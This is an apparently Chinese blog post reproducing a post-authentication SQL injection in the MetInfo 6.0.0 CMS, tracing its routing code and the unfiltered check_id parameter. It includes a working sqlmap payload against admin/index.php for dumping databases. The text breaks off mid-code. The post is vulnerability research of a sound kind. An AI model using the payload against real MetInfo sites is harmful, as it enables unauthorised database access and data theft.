<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang="">
<head><meta name="generator" content="Hexo 3.9.0">
  <script>
    (function(){
        if(''){
            if (prompt('请输入文章密码') !== ''){
                alert('密码错误');
                history.back();
            }
        }
    })();
</script>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">






















<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">

<link rel="stylesheet" href="/css/main.css?v=7.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">


  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.2.0',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
    copycode: {"enable":false,"show_result":false,"style":null},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    translation: {
      copy_button: 'Copy',
      copy_success: 'Copied',
      copy_failure: 'Copy failed'
    }
  };
</script>

  <meta name="description" content="0x01前言0x01.1菜的明明白白这两天一直在复现metinfo这个cms,然后看了师傅Ashe的一个帖子，感觉自己又在此学到了一点东西，就对这个cms的路由有了更多理解。的在此记录一下。 0x01.2准备metinfo6.0.0php5.5+mysqlubuntu 19 0x02漏洞分析Metinfo6.0.0后台sql注入就如之前的分析一样，每一个模块，比如message处，或者feedba">
<meta name="keywords" content="root">
<meta property="og:type" content="article">
<meta property="og:title" content="在复现中学到的路由利用">
<meta property="og:url" content="http://yoursite.com/2019/07/14/在审计中学到的路由利用/index.html">
<meta property="og:site_name" content="The clown is laughing at you">
<meta property="og:description" content="0x01前言0x01.1菜的明明白白这两天一直在复现metinfo这个cms,然后看了师傅Ashe的一个帖子，感觉自己又在此学到了一点东西，就对这个cms的路由有了更多理解。的在此记录一下。 0x01.2准备metinfo6.0.0php5.5+mysqlubuntu 19 0x02漏洞分析Metinfo6.0.0后台sql注入就如之前的分析一样，每一个模块，比如message处，或者feedba">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/2019/07/14/在审计中学到的路由利用/1.png">
<meta property="og:image" content="http://yoursite.com/2019/07/14/在审计中学到的路由利用/2.png">
<meta property="og:image" content="http://yoursite.com/2019/07/14/在审计中学到的路由利用/3.png">
<meta property="og:image" content="http://yoursite.com/2019/07/14/在审计中学到的路由利用/4.png">
<meta property="og:image" content="http://yoursite.com/2019/07/14/在审计中学到的路由利用/5.png">
<meta property="og:updated_time" content="2019-07-15T02:41:12.997Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="在复现中学到的路由利用">
<meta name="twitter:description" content="0x01前言0x01.1菜的明明白白这两天一直在复现metinfo这个cms,然后看了师傅Ashe的一个帖子，感觉自己又在此学到了一点东西，就对这个cms的路由有了更多理解。的在此记录一下。 0x01.2准备metinfo6.0.0php5.5+mysqlubuntu 19 0x02漏洞分析Metinfo6.0.0后台sql注入就如之前的分析一样，每一个模块，比如message处，或者feedba">
<meta name="twitter:image" content="http://yoursite.com/2019/07/14/在审计中学到的路由利用/1.png">





  
  
  <link rel="canonical" href="http://yoursite.com/2019/07/14/在审计中学到的路由利用/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  
  <title>在复现中学到的路由利用 | The clown is laughing at you</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">The clown is laughing at you</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/14/在审计中学到的路由利用/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/name.png">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">在复现中学到的路由利用

              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-07-14 15:29:52" itemprop="dateCreated datePublished" datetime="2019-07-14T15:29:52+08:00">2019-07-14</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-15 10:41:12" itemprop="dateModified" datetime="2019-07-15T10:41:12+08:00">2019-07-15</time>
              </span>
            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><h2 id="0x01-1菜的明明白白"><a href="#0x01-1菜的明明白白" class="headerlink" title="0x01.1菜的明明白白"></a>0x01.1菜的明明白白</h2><p>这两天一直在复现metinfo这个cms,然后看了师傅<a href="https://bbs.ichunqiu.com/home.php?mod=space&amp;uid=191566&amp;do=thread&amp;view=me&amp;from=space" target="_blank" rel="noopener">Ashe</a>的一个帖子，感觉自己又在此学到了一点东西，就对这个cms的路由有了更多理解。的在此记录一下。</p>
<h2 id="0x01-2准备"><a href="#0x01-2准备" class="headerlink" title="0x01.2准备"></a>0x01.2准备</h2><p>metinfo6.0.0<br>php5.5+mysql<br>ubuntu 19</p>
<h1 id="0x02漏洞分析"><a href="#0x02漏洞分析" class="headerlink" title="0x02漏洞分析"></a>0x02漏洞分析</h1><h2 id="Metinfo6-0-0后台sql注入"><a href="#Metinfo6-0-0后台sql注入" class="headerlink" title="Metinfo6.0.0后台sql注入"></a>Metinfo6.0.0后台sql注入</h2><p>就如之前的分析一样，每一个模块，比如message处，或者feedback处都有一个index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//message</span></span><br><span class="line">define(<span class="string">'M_NAME'</span>, <span class="string">'message'</span>);</span><br><span class="line">define(<span class="string">'M_MODULE'</span>, <span class="string">'web'</span>);</span><br><span class="line">define(<span class="string">'M_CLASS'</span>, <span class="string">'message'</span>);</span><br><span class="line">define(<span class="string">'M_ACTION'</span>, <span class="string">'domessage'</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../app/system/entrance.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//feedback</span></span><br><span class="line">define(<span class="string">'M_NAME'</span>, <span class="string">'feedback'</span>);</span><br><span class="line">define(<span class="string">'M_MODULE'</span>, <span class="string">'web'</span>);</span><br><span class="line">define(<span class="string">'M_CLASS'</span>, <span class="string">'feedback'</span>);</span><br><span class="line">define(<span class="string">'M_ACTION'</span>, <span class="string">'dofeedback'</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../app/system/entrance.php'</span>;</span><br></pre></td></tr></table></figure></p>
<p>每一个index.php里面都包含了entrance.php，然后有定义需要调用的模块，类，方法。这是被写死了。这个cms的特色就在于此。定义了这些的常量，调用方法就会如下所言<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path:/app/system/M_NAME/M_MODULE/M_CLASS.class.php     函数 M_ACTION</span><br></pre></td></tr></table></figure></p>
<p>但是却不能直接调用。<br>大佬的话说就是： 这里奇葩的是他基本都是自己封装好了这些常量，不能随意去调用类函数，如果想随意调用的话需要找入口，而且只能调用函数开头带do字符的函数。</p>
<p>但是我们看向<strong>/admin/index.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'IN_ADMIN'</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//接口</span></span><br><span class="line">$M_MODULE=<span class="string">'admin'</span>;</span><br><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">'m'</span>])$M_MODULE=$_GET[<span class="string">'m'</span>];</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'n'</span>])$_GET[<span class="string">'n'</span>]=<span class="string">"index"</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'c'</span>])$_GET[<span class="string">'c'</span>]=<span class="string">"index"</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'a'</span>])$_GET[<span class="string">'a'</span>]=<span class="string">"doindex"</span>;</span><br><span class="line">@define(<span class="string">'M_NAME'</span>, $_GET[<span class="string">'n'</span>]);</span><br><span class="line">@define(<span class="string">'M_MODULE'</span>, $M_MODULE);</span><br><span class="line">@define(<span class="string">'M_CLASS'</span>, $_GET[<span class="string">'c'</span>]);</span><br><span class="line">@define(<span class="string">'M_ACTION'</span>, $_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../app/system/entrance.php'</span>;</span><br></pre></td></tr></table></figure></p>
<p>理解这个index.php，这里就相当于一个路口，我们可以通过这个文件作为<strong>任意调用的入口</strong>。</p>
<h2 id="0x02-2demo一下，"><a href="#0x02-2demo一下，" class="headerlink" title="0x02.2demo一下，"></a>0x02.2demo一下，</h2><h3 id="0x02-2-1-在线反馈处后台sql注入"><a href="#0x02-2-1-在线反馈处后台sql注入" class="headerlink" title="0x02.2.1 在线反馈处后台sql注入"></a>0x02.2.1 在线反馈处后台sql注入</h3><p>定位：MetInfo6.0.0/app/system/feedback/admin/feedback_admin.class.php::doexport()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> $_M;</span><br><span class="line">$class1 = $_M[form][class1];</span><br><span class="line">$met_fd_export = $_M[form][met_fd_export];</span><br><span class="line">... ... ...</span><br><span class="line">... ... ...</span><br><span class="line"><span class="keyword">foreach</span> ($settings_arr <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">  <span class="keyword">if</span> ($val[<span class="string">'columnid'</span>] == $class1) &#123;</span><br><span class="line">    $tingname = $val[<span class="string">'name'</span>] . <span class="string">'_'</span> . $val[<span class="string">'columnid'</span>];</span><br><span class="line">    $$val[<span class="string">'name'</span>] = $$tingname;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">... ... ...</span><br><span class="line">... ... ...</span><br><span class="line"><span class="keyword">if</span> ($class1) &#123;</span><br><span class="line">  $where .= <span class="string">"AND class1='$class1'"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($met_fd_export == <span class="number">-1</span>) &#123;</span><br><span class="line">  $where = <span class="string">" "</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	... ...</span><br><span class="line">&#125; </span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> ($_M[<span class="string">'form'</span>][<span class="string">'check_id'</span>] != <span class="string">""</span>) &#123;</span><br><span class="line">  $where .= <span class="string">" AND id in (&#123;$_M['form']['check_id']&#125;)"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$query = <span class="string">"SELECT * FROM &#123;$_M[table][feedback]&#125; where lang='&#123;$this-&gt;lang&#125;' "</span> . $where;</span><br><span class="line">$result = DB::query($query);</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure></p>
<p>漏洞成因：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$where .= <span class="string">" AND id in (&#123;$_M['form']['check_id']&#125;)"</span>;</span><br></pre></td></tr></table></figure></p>
<p>其中的<code>$_M[&#39;form&#39;][&#39;check_id&#39;]</code>的是用户可以输入的值，关于用户输入，所有的类继承于common.inc.php的common的这个一级基类<br>其中函数<strong>__construct()</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $_M;<span class="comment">//全局数组$_M</span></span><br><span class="line">		ob_start();<span class="comment">//开启缓存</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;load_mysql();<span class="comment">//数据库连接</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;load_form();<span class="comment">//表单过滤</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;load_lang();<span class="comment">//加载语言配置</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;load_config_global();<span class="comment">//加载全站配置数据</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;load_url_site();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;load_config_lang();<span class="comment">//加载当前语言配置数据</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;load_url();<span class="comment">//加载url数据</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>跟进函数load_form()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">global</span> $_M;</span><br><span class="line">$_M[<span class="string">'form'</span>] =<span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">isset</span>($_REQUEST[<span class="string">'GLOBALS'</span>]) &amp;&amp; <span class="keyword">exit</span>(<span class="string">'Access Error'</span>);</span><br><span class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">	$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $_M[<span class="string">'form'</span>][$_key] = daddslashes($_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">	$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $_M[<span class="string">'form'</span>][$_key] = daddslashes($_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">	$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $_M[<span class="string">'form'</span>][$_key] = daddslashes($_value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>跟进daddslashes()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">daddslashes</span><span class="params">($string, $force = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">	!defined(<span class="string">'MAGIC_QUOTES_GPC'</span>) &amp;&amp; define(<span class="string">'MAGIC_QUOTES_GPC'</span>, get_magic_quotes_gpc());</span><br><span class="line">	<span class="keyword">if</span>(!MAGIC_QUOTES_GPC || $force) &#123;</span><br><span class="line">		<span class="keyword">if</span>(is_array($string)) &#123;</span><br><span class="line">			<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">				$string[$key] = daddslashes($val, $force);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>))&#123;</span><br><span class="line">				$string = trim(addslashes(sqlinsert($string)));</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$string = trim(addslashes($string));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个函数如果仅仅只是对用户输入的值进行addslashes()处理,关于我们是如何绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>))&#123;</span><br><span class="line">				$string = trim(addslashes(sqlinsert($string)));</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$string = trim(addslashes($string));</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure></p>
<p>因为我们在admin/index.php入手，所以在在这个文件中是有设置IN_ADMIN的值为ture<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'IN_ADMIN'</span>, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure></p>
<p>所以最终<strong><code>$_M[&#39;form&#39;][&#39;check_id&#39;]</code></strong>，就没有很好的处理过滤。<br>这里放出POC<br><img src="/2019/07/14/在审计中学到的路由利用/1.png" alt=""><br><img src="/2019/07/14/在审计中学到的路由利用/2.png" alt=""><br>这个爆库payload如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"http://xxxx/admin/index.php/?lang=cn&amp;anyid=&amp;n=feedback&amp;c=feedback_admin&amp;a=doexport&amp;class1=&amp;met_fd_export=-1&amp;check_id=1"<span class="comment">--cookie "抓包获取的cookie内容" -p check_id --dbms=mysql –dbs</span></span><br></pre></td></tr></table></figure></p>
<h4 id="——-分割线———"><a href="#——-分割线———" class="headerlink" title="——-分割线———"></a>——-分割线———</h4><p>admin类是可以调用任意类的do函数()，现在分析一下，因为Ashe师傅的payload刚开始没怎么看懂，然后就自己琢磨了一下，整个调用的过程。这里是可以用debug来调试，但是因为最近刚学会这个，还不大会用，所以决定自己手动看看index.php是如何调用doexport()方法的。我菜的明明白白…….</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$M_MODULE=<span class="string">'admin'</span>;</span><br><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">'m'</span>])$M_MODULE=$_GET[<span class="string">'m'</span>];</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'n'</span>])$_GET[<span class="string">'n'</span>]=<span class="string">"index"</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'c'</span>])$_GET[<span class="string">'c'</span>]=<span class="string">"index"</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'a'</span>])$_GET[<span class="string">'a'</span>]=<span class="string">"doindex"</span>;</span><br><span class="line">@define(<span class="string">'M_NAME'</span>, $_GET[<span class="string">'n'</span>]);</span><br><span class="line">@define(<span class="string">'M_MODULE'</span>, $M_MODULE);</span><br><span class="line">@define(<span class="string">'M_CLASS'</span>, $_GET[<span class="string">'c'</span>]);</span><br><span class="line">@define(<span class="string">'M_ACTION'</span>, $_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../app/system/entrance.php'</span>;</span><br></pre></td></tr></table></figure>
<p>我们可以看到这里的<strong>$_NAME</strong>,<strong>$_CLASS</strong>,<strong>$_ACTION</strong>,可以由用户输入决定。<br>然后我们分析../app/system/entrance.php(可以将payload代入理解,我是通读的这个文件的所有代码，然后这里里面一段比较重要的代码)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(M_TYPE == <span class="string">'system'</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(M_MODULE == <span class="string">'include'</span>)&#123;</span><br><span class="line">		define (<span class="string">'PATH_OWN_FILE'</span>, PATH_APP.M_TYPE.<span class="string">'/'</span>.M_MODULE.<span class="string">'/module/'</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		define (<span class="string">'PATH_OWN_FILE'</span>, PATH_APP.M_TYPE.<span class="string">'/'</span>. M_NAME.<span class="string">'/'</span>.M_MODULE.<span class="string">'/'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	define (<span class="string">'PATH_OWN_FILE'</span>, PATH_APP.M_TYPE.<span class="string">'/'</span>.M_NAME.<span class="string">'/'</span>.M_MODULE.<span class="string">'/'</span>);<span class="comment">//app/system/feedback/admin/</span></span><br><span class="line">	define (<span class="string">'PATH_APP_FILE'</span>, PATH_APP.M_TYPE.<span class="string">'/'</span>.M_NAME.<span class="string">'/'</span>);<span class="comment">//app/system/feedback/</span></span><br></pre></td></tr></table></figure></p>
<p>接着包含load.class.php，调用module()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> PATH_SYS_CLASS.<span class="string">'load.class.php'</span>;</span><br><span class="line">load::module()</span><br></pre></td></tr></table></figure></p>
<p>加载module()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span><span class="params">($path = <span class="string">''</span>, $modulename = <span class="string">''</span>, $action = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!$path) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!$path) $path = PATH_OWN_FILE;<span class="comment">//app/system/feedback/admin/</span></span><br><span class="line">		<span class="keyword">if</span> (!$modulename) $modulename = M_CLASS;<span class="comment">//feedback_admin</span></span><br><span class="line">		<span class="keyword">if</span> (!$action) $action = M_ACTION;<span class="comment">//doexport</span></span><br><span class="line">		<span class="keyword">if</span> (!$action) $action = <span class="string">'doindex'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">self</span>::_load_class($path, $modulename, $action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>调用本类函数的_load_class()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">_load_class</span><span class="params">($path, $classname, $action = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">		$classname=str_replace(<span class="string">'.class.php'</span>, <span class="string">''</span>, $classname);</span><br><span class="line">		$is_myclass = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">self</span>::$mclass[$classname])&#123;<span class="comment">//$myclass[$classname]此时为空</span></span><br><span class="line">			<span class="keyword">if</span>(file_exists($path.$classname.<span class="string">'.class.php'</span>))&#123;<span class="comment">//判断是否存在/app/sysytem/feedback/admin/feedback_admin.class.php</span></span><br><span class="line">				<span class="keyword">require_once</span> $path.$classname.<span class="string">'.class.php'</span>;<span class="comment">//包含/app/sysytem/feedback/admin/feedback_admin.class.php</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> str_replace(PATH_WEB, <span class="string">''</span>, $path).$classname.<span class="string">'.class.php is not exists'</span>;</span><br><span class="line">				<span class="keyword">exit</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$myclass = <span class="string">"my_&#123;$classname&#125;"</span>;</span><br><span class="line">			<span class="keyword">if</span> (file_exists($path.<span class="string">'myclass/'</span>.$myclass.<span class="string">'.class.php'</span>)) &#123;</span><br><span class="line">				$is_myclass = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">require_once</span> $path.<span class="string">'myclass/'</span>.$myclass.<span 